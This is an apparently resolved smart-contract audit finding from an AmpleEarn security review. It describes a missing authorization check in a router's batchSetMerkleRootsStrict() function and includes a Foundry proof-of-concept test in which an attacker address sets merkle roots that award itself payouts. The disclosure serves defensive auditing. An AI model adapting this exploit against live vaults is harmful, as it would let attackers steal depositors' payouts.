---
tags:
  - lang/solidity
  - sector/stable
  - platform/pashov
  - has/github
  - has/poc
  - severity/high
  - fix/use-reentrancy-guard
protocol: "[[AmpleEarn]]"
auditors:
  - "[[Pashov Audit Group]]"
report: "https://github.com/pashov/audits/blob/master/team/md/AmpleEarn-security-review_2025-12-12.md"
genome:
  - "[[missing-modifier]]"
  - "[[use-reentrancy-guard]]"
  - "[[direct-drain]]"
  - "[[account-ownership]]"
  - "[[batch-item-auth]]"
  - "[[reentrancy-guard]]"
---
# [C-01] Unrestricted router allows unauthorized merkle root setting

- id: 64041
- impact: HIGH
- protocol: AmpleEarn_2025-12-12
- reporter: Pashov Audit Group
- source: https://github.com/pashov/audits/blob/master/team/md/[[AmpleEarn]]-security-review_2025-12-12.md

## Summary


The bug report is about a function called AmpleEarnRouter.batchSetMerkleRootsStrict() which is not properly checking for authorization before setting merkle roots. This could allow anyone to set merkle roots for any vault and steal payouts. The report suggests enforcing authorization or calling the function through a different method to prevent this issue.

## Details


_Resolved_

## Severity

**Impact:** High

**Likelihood:** High

## Summary

AmpleEarnRouter.batchSetMerkleRootsStrict() is calling setMerkleRoots() directly without going through EVC. If the intention is to use the router as a payout manager, like in the tests (AmpleEarnRouterTest), this could allow anyone to set merkle roots for any vault and steal payouts.

## Description

Inside AmpleEarn.setMerkleRoots(), caller authorization is based on _msgSenderOnlyEVCAccountOwner(), which returns msg.sender unless the call comes from the EVC:

```solidity
function setMerkleRoots(
    uint256 totalTickets,
    uint8 designatedRecipientsCount,
    bytes32 designatedRecipientsRoot,
    bytes32 participantsRoot,
    VRFProofDetails calldata vrfProofDetails
) external nonReentrant returns (uint256 payoutId) {
    address msgSender = _msgSenderOnlyEVCAccountOwner();
    if (!isPayoutManager[msgSender] && msgSender != owner()) revert AmpleErrorsLib.NotPayoutManagerRole();
    // ...
}
```
Because the router calls setMerkleRoots() directly (not via EVC), the vault’s msgSender will be the router address, not the external caller.  This causes problems like: 

- If the router is not a payout manager on the vault, router calls revert with NotPayoutManagerRole().
- If the router is granted the payout manager role on a vault, then any external caller can call the router and successfully set merkle roots on that vault.

POC:

AmpleEarnForkTest.sol

```solidity
function testFork_SetMerkleRootsWithDifferentAddress()
        public
        whenUserHasBalance(address(USDC), DEPOSITOR, 100e6)
        whenUserHasDeposit(DEPOSITOR, 100e6)
    {
        skip(7 days);
        vm.roll(block.number + 50400); // ~7 days of blocks
        _accrueInterest();
        address attacker = makeAddr("Attacker");

        // Generate merkle roots and total tickets.
        // NOTE: Use scoped blocks to avoid "stack too deep" in this large fork test.
        bytes32 merkleRootForParticipants;
        bytes32 merkleRootForDesignatedRecipients;
        uint256 totalTickets = 250e6; // 100 + 50 + 75 + 25
        {
            // Create user total tickets data for merkle tree
            TicketMerkleLeaf[] memory leaves = new TicketMerkleLeaf[](4);
            leaves[0] = TicketMerkleLeaf({user: attacker, totalTickets: 100e6, ticketStart: 0, ticketEnd: 99e6});
            leaves[1] =
                TicketMerkleLeaf({user: SUPPLIER, totalTickets: 50e6, ticketStart: 100e6, ticketEnd: 149e6});
            leaves[2] =
                TicketMerkleLeaf({user: RECEIVER, totalTickets: 75e6, ticketStart: 150e6, ticketEnd: 224e6});
            leaves[3] =
                TicketMerkleLeaf({user: ONBEHALF, totalTickets: 25e6, ticketStart: 225e6, ticketEnd: 249e6});

            DesignatedRecipientMerkleLeaf[] memory designatedRecipientLeaves = new DesignatedRecipientMerkleLeaf[](4);
            designatedRecipientLeaves[0] =
                DesignatedRecipientMerkleLeaf({user: attacker, payoutAmount: 100e6, designatedRecipientIndex: 0});
            designatedRecipientLeaves[1] =
                DesignatedRecipientMerkleLeaf({user: SUPPLIER, payoutAmount: 50e6, designatedRecipientIndex: 1});
            designatedRecipientLeaves[2] =
                DesignatedRecipientMerkleLeaf({user: RECEIVER, payoutAmount: 75e6, designatedRecipientIndex: 2});
            designatedRecipientLeaves[3] =
                DesignatedRecipientMerkleLeaf({user: ONBEHALF, payoutAmount: 25e6, designatedRecipientIndex: 3});

            merkleRootForParticipants = MerkleHelper.generateMerkleRootForParticipants(leaves);
            merkleRootForDesignatedRecipients =
                MerkleHelper.generateMerkleRootForDesignatedRecipients(designatedRecipientLeaves);
        }
        
        {
            
            vm.startPrank(attacker);
            SetMerkleRootsParams[] memory params = new SetMerkleRootsParams[](1);
            params[0] = SetMerkleRootsParams({
                vault: address(vault),
                participantsRoot: merkleRootForParticipants,
                designatedRecipientsRoot: merkleRootForDesignatedRecipients,
                designatedRecipientsCount: 4,
                totalTickets: totalTickets,
                vrfProofDetails: VRFProofDetails({
                    proof: bytes32(uint256(1)),
                    seed: bytes32(uint256(2)),
                    publicKey: bytes32(uint256(3)),
                    vrfHash: bytes32(uint256(4))
                })
            });

            uint256[] memory payoutIds = router.batchSetMerkleRootsStrict(params);
            
        }
    }
```
## Recommendations

Enforce authorization inside batchSetMerkleRootsStrict() or call the setMerkleRoots() through EVC.
